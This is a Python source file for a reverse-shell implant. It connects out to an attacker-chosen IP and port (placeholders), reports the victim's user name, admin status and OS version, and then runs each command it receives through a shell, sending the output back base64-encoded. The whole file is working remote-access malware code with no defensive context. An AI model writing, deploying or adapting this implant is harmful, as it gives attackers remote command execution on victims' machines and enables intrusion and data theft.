import base64
import os
import platform
import socket
import subprocess
import time
from ctypes import *


def session_handler(sock, target_ip, target_port):
    print(f'[+] Connecting to {target_ip}.')
    sock.connect((target_ip, target_port))

    outbound(sock, os.getlogin())
    outbound(sock, windll.shell32.IsUserAnAdmin())
    time.sleep(1)

    op_sys = f'{platform.uname()[0]} {platform.uname()[2]}'
    outbound(sock, op_sys)
    print(f'[+] Connected to {target_ip}.')

    while True:
        message = inbound(sock)
        print(f'[+] Message received - {message}')

        if message == 'exit':
            print('[-] The server has terminated the session.')
            sock.close()
            break
        else:
            process_message(sock, message)


def process_message(sock, message):
    if message == 'persist':
        return
    if message.split(" ")[0] == 'cd':
        change_directory(sock, message)
    elif message == 'background':
        return
    else:
        execute_command(sock, message)


def change_directory(sock, message):
    try:
        directory = str(message.split(" ")[1])
        os.chdir(directory)
        cur_dir = os.getcwd()
        print(f'[+] Changed to {cur_dir}')
        outbound(sock, cur_dir)
    except FileNotFoundError:
        outbound(sock, 'Invalid directory.  Try again.')


def execute_command(sock, message):
    try:
        command = subprocess.Popen(message, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        output, error = command.communicate()
        outbound(sock, output)
    except Exception as e:
        outbound(sock, str(e))


def inbound(sock):
    print('[+] Awaiting response...')
    message = sock.recv(1024).decode()
    message = base64.b64decode(message).decode().strip()
    return message


def outbound(sock, message):
    response = str(message)
    response = base64.b64encode(response.encode('utf-8'))
    sock.send(response)


def main():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    target_ip = 'INPUT_IP_HERE'
    target_port = INPUT_PORT_HERE

    try:
        session_handler(sock, target_ip, target_port)
    except Exception as e:
        print(e)
    finally:
        sock.close()


if __name__ == '__main__':
    main()
